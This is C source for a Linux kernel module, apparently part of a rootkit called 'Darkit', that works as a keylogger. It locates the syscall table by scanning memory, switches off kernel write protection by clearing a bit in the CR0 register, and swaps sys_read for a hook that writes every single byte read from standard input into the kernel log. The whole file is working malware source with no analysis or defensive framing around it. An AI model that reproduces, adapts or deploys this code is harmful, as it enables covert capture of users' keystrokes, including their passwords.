#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <asm/paravirt.h>

MODULE_LICENSE("GPL");

unsigned long **sys_call_table;
unsigned long original_cr0;

asmlinkage long ( *ref_sys_read )( unsigned int fd, char __user *buf, size_t count );

/* intercept key strokes */
asmlinkage long new_sys_read( unsigned int fd, char __user *buf, size_t count ) {
    long ret;
    ret = ref_sys_read( fd, buf, count );

    if( count == 1 && fd == 0 )
        printk(KERN_INFO "[+] Darkit Keylog: %X", buf[0] );

    return ret;
}

static unsigned long **aquire_sys_call_table( void ) {
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;

    while ( offset < ULLONG_MAX ) {
        sct = ( unsigned long ** )offset;

        if ( sct[__NR_close] == ( unsigned long * ) sys_close ) 
            return sct;

        offset += sizeof( void * );
    }

    return NULL;
}

static int __init interceptor_start( void ) {
    if( !( sys_call_table = aquire_sys_call_table() ) )
        return -1;

    original_cr0 = read_cr0();

    write_cr0( original_cr0 & ~0x00010000 );
    ref_sys_read = ( void * )sys_call_table[__NR_read];
    sys_call_table[__NR_read] = ( unsigned long * )new_sys_read;
    write_cr0( original_cr0 );

    return 0;
}

static void __exit interceptor_end( void ) {
    if( !sys_call_table ) {
        return;
    }

    write_cr0( original_cr0 & ~0x00010000 );
    sys_call_table[__NR_read] = ( unsigned long * )ref_sys_read;
    write_cr0( original_cr0 );
}

module_init( interceptor_start );
module_exit( interceptor_end );
